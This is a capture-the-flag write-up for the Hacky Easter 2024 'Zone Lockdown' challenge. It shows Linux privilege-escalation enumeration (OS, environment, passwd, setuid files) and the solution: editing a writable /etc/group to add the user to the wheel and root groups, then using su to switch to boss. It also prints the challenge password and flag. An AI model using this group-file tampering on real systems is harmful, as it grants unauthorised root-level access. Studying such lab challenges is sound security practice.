# Challenge "Zone Lockdown"
![Banner Image](banner.jpg)

This is an emergency! Your network was infiltrated, and you immediately need to initiate a zone lockdown!

You do have access to the system (user minion), and you know the lockdown script.

But damn, one must become the boss to execute it!

Notes:

- there are multiple instances running - if yours is broken, switch to another one
- ssh ch.hackyeaster.com -l minion -p <PORT> where <PORT> is one of: 2411, 2412, 2413, 2414
- password for both minion and boss: letmein
- script to run: /home/boss/lockdown.sh
- you'll be kicked off a server if the lockdown is triggered by someone else
- the servers are restarted every hour at x:00


# Solution
First, I had to get myself an overview of what system I have.

Some commands are not found:
- sudo
- ps
- crontab
- ssh

Installed:
- Python3

Some approaches from https://book.hacktricks.xyz/linux-hardening/privilege-escalation

## OS Info

    [minion@3b056ac8fba1 ~]$ (cat /proc/version || uname -a ) 2>/dev/null
    Linux version 5.15.0-100-generic (buildd@lcy02-amd64-116) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #110-Ubuntu SMP Wed Feb 7 13:27:48 UTC 2024

    [minion@3b056ac8fba1 ~]$ cat /etc/os-release 2>/dev/null
    NAME="Red Hat Enterprise Linux"
    VERSION="9.3 (Plow)"
    ID="rhel"
    ID_LIKE="fedora"
    VERSION_ID="9.3"
    PLATFORM_ID="platform:el9"
    PRETTY_NAME="Red Hat Enterprise Linux 9.3 (Plow)"
    ANSI_COLOR="0;31"
    LOGO="fedora-logo-icon"
    CPE_NAME="cpe:/o:redhat:enterprise_linux:9::baseos"
    HOME_URL="https://www.redhat.com/"
    DOCUMENTATION_URL="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9"
    BUG_REPORT_URL="https://bugzilla.redhat.com/"

    REDHAT_BUGZILLA_PRODUCT="Red Hat Enterprise Linux 9"
    REDHAT_BUGZILLA_PRODUCT_VERSION=9.3
    REDHAT_SUPPORT_PRODUCT="Red Hat Enterprise Linux"
    REDHAT_SUPPORT_PRODUCT_VERSION="9.3"

## PATH

    [minion@3b056ac8fba1 ~]$ echo $PATH
    /home/minion/.local/bin:/home/minion/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin

## ENV

    [minion@3b056ac8fba1 ~]$ (env || set) 2>/dev/null
    SHELL=/bin/bash
    HISTCONTROL=ignoredups
    HISTSIZE=1000
    HOSTNAME=3b056ac8fba1
    PWD=/home/minion
    LOGNAME=minion
    MOTD_SHOWN=pam
    HOME=/home/minion
    LANG=C.utf8
    SSH_CONNECTION=178.197.210.54 46746 172.20.0.6 2222
    TERM=xterm-256color
    USER=minion
    SHLVL=1
    SSH_CLIENT=178.197.210.54 46746 2222
    which_declare=declare -f
    PATH=/home/minion/.local/bin:/home/minion/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin
    MAIL=/var/spool/mail/minion
    SSH_TTY=/dev/pts/0
    BASH_FUNC_which%%=() {  ( alias;
    eval ${which_declare} ) | /usr/bin/which --tty-only --read-alias --read-functions --show-tilde --show-dot $@
    }
    _=/usr/bin/env

## Alias

    [minion@3b056ac8fba1 ~]$ alias
    alias egrep='egrep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias grep='grep --color=auto'
    alias zegrep='zegrep --color=auto'
    alias zfgrep='zfgrep --color=auto'
    alias zgrep='zgrep --color=auto'

## Passwd

    [minion@a20fe5cbd930 ~]$ cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    games:x:12:100:games:/usr/games:/sbin/nologin
    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
    nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
    systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
    dbus:x:81:81:System message bus:/:/sbin/nologin
    tss:x:59:59:Account used for TPM access:/:/sbin/nologin
    systemd-oom:x:995:995:systemd Userspace OOM Killer:/:/usr/sbin/nologin
    sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
    minion:x:1000:1000::/home/minion:/bin/bash
    boss:x:1001:1001::/home/boss:/bin/bash

## Symbolic Link

    [minion@f5e60f29a415 ~]$ ln -s /home/boss/lockdown.sh link
    ln: failed to create symbolic link 'link': Permission denied

## Setuid/Setgid

    [minion@f5e60f29a415 ~]$ find / -perm /6000 -type f
    find: ‘/home/boss’: Permission denied
    /usr/sbin/pam_timestamp_check
    /usr/sbin/userhelper
    /usr/sbin/unix_chkpwd
    /usr/libexec/utempter/utempter
    /usr/libexec/openssh/ssh-keysign
    /usr/bin/chage
    /usr/bin/umount
    /usr/bin/newgrp
    /usr/bin/su
    /usr/bin/passwd
    /usr/bin/write
    /usr/bin/gpasswd
    /usr/bin/mount
    find: ‘/usr/share/empty.sshd’: Permission denied
    find: ‘/proc/tty/driver’: Permission denied
    find: ‘/proc/1/task/1/fd’: Permission denied
    find: ‘/proc/1/task/1/fdinfo’: Permission denied
    find: ‘/proc/1/task/1/ns’: Permission denied
    find: ‘/proc/1/fd’: Permission denied
    find: ‘/proc/1/map_files’: Permission denied
    find: ‘/proc/1/fdinfo’: Permission denied
    find: ‘/proc/1/ns’: Permission denied
    find: ‘/proc/65/task/65/fd’: Permission denied
    find: ‘/proc/65/task/65/fdinfo’: Permission denied
    find: ‘/proc/65/task/65/ns’: Permission denied
    find: ‘/proc/65/fd’: Permission denied
    find: ‘/proc/65/map_files’: Permission denied
    find: ‘/proc/65/fdinfo’: Permission denied
    find: ‘/proc/65/ns’: Permission denied
    find: ‘/proc/67/task/67/fd’: Permission denied
    find: ‘/proc/67/task/67/fdinfo’: Permission denied
    find: ‘/proc/67/task/67/ns’: Permission denied
    find: ‘/proc/67/fd’: Permission denied
    find: ‘/proc/67/map_files’: Permission denied
    find: ‘/proc/67/fdinfo’: Permission denied
    find: ‘/proc/67/ns’: Permission denied
    find: ‘/proc/103/task/103/fdinfo/6’: No such file or directory
    find: ‘/proc/103/fdinfo/5’: No such file or directory
    find: ‘/lost+found’: Permission denied
    find: ‘/var/lib/private’: Permission denied
    find: ‘/var/cache/ldconfig’: Permission denied
    /opt/reset
    find: ‘/etc/ssh/sshd_config.d’: Permission denied
    find: ‘/root/.ssh’: Permission denied


## Startup

    [minion@a0c397520e66 run]$ cat /etc/rc.d/rc.local 
    #!/bin/bash
    # THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES
    #
    # It is highly advisable to create own systemd services or udev rules
    # to run scripts during boot instead of using this file.
    #
    # In contrast to previous versions due to parallel execution during boot
    # this script will NOT be run after all other services.
    #
    # Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure
    # that this script will be executed during boot.

    touch /var/lock/subsys/local

## How to get the flag: Wheel group in /etc/group
The su permission seems to be missing because of the missing wheel group assignment. This can be corrected directly in /etc/group. Here the complete command line trace:

    [minion@9706f0d02e1d ~]$ vi /etc/group
    [minion@9706f0d02e1d ~]$ cat /etc/group
    root:x:0:minion
    bin:x:1:
    daemon:x:2:
    sys:x:3:
    adm:x:4:
    tty:x:5:
    disk:x:6:
    lp:x:7:
    mem:x:8:
    kmem:x:9:
    wheel:x:10:minion
    cdrom:x:11:
    mail:x:12:
    man:x:15:
    dialout:x:18:
    floppy:x:19:
    games:x:20:
    tape:x:33:
    video:x:39:
    ftp:x:50:
    lock:x:54:
    audio:x:63:
    users:x:100:
    nobody:x:65534:
    utmp:x:22:
    utempter:x:35:
    input:x:999:
    kvm:x:36:
    render:x:998:
    systemd-journal:x:190:
    systemd-coredump:x:997:
    dbus:x:81:
    tss:x:59:
    sgx:x:996:
    systemd-oom:x:995:
    ssh_keys:x:994:
    sshd:x:74:
    minion:x:1000:

    [minion@9706f0d02e1d ~]$ su -l boss
    Password: 
    [boss@9706f0d02e1d ~]$ ls
    lockdown.sh
    [boss@9706f0d02e1d ~]$ ./lockdown.sh 
    ZONE LOCKDOWN initiated!

    Flag:  he2024{z0ne_l0ckd0wn_succ3ssfully_tr1gg3r3d}\n
    ZONE LOCKDOWN completed, good bye.
    Connection to ch.hackyeaster.com closed by remote host.
    Connection to ch.hackyeaster.com closed.


## The flag
    he2024{z0ne_l0ckd0wn_succ3ssfully_tr1gg3r3d}
